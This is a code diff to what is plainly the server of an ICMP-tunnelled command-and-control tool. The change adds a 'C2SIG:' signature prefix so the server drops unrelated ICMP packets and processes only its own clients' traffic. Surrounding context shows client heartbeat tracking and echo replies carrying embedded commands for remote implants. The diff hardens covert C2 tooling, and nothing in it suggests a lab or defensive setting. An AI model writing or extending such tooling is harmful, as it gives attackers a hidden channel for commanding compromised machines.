@@ -8,6 +8,7 @@ from collections import defaultdict
 LISTEN_IP = "0.0.0.0"  # Listen on all interfaces
 ICMP_ECHO_REPLY = 0
 ICMP_CODE = 0
+C2_PREFIX = "C2SIG:"
 
 # Track connected clients
 clients = {}
@@ -18,7 +19,15 @@ def parse_icmp_packet(packet):
     icmp_header = packet[20:28]
     _type, _code, _checksum, identifier, seq = struct.unpack("!BBHHH", icmp_header)
     payload = packet[28:].decode("utf-8", errors="ignore").strip()
-    return identifier, seq, payload
+    
+    # Check if this is a valid C2 packet by looking for our prefix
+    if not payload.startswith(C2_PREFIX):
+        return None, None, None  # Signal this is not a valid C2 packet
+    
+    # Remove the prefix before processing
+    real_payload = payload[len(C2_PREFIX):]
+    
+    return identifier, seq, real_payload
 
 def create_icmp_reply(identifier, seq, message):
     """Create an ICMP Echo Reply packet with embedded command"""
@@ -115,7 +124,9 @@ def main():
         if sock in ready:
             data, addr = sock.recvfrom(2048)
             identifier, seq, payload = parse_icmp_packet(data)
-            
+            if identifier is None:
+                continue
+                
             # Extract client ID from heartbeat
             client_id = identifier
             if payload.startswith("ALIVE:"):
